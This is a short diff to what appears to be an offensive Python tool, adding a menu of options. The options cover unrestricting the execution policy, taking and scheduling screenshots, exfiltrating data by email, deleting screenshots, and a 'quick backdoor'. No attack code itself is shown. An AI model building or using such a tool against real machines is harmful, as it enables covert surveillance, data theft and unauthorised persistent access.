@@ -22,3 +22,15 @@ def logo():
 
 	return logo
 
+# options
+OPTIONS = '''
+1. Set Execution Policy to Unrestricted
+2. Take screen shot
+3. Schedule a task to take screen shots
+4. Extract data via email
+5. Schedule a task for data ex-filtration
+6. Delete screen shots
+7. Schedule a task to delete screen shots
+8. Hail Mary: Quick backdoor
+9. Exit
+'''
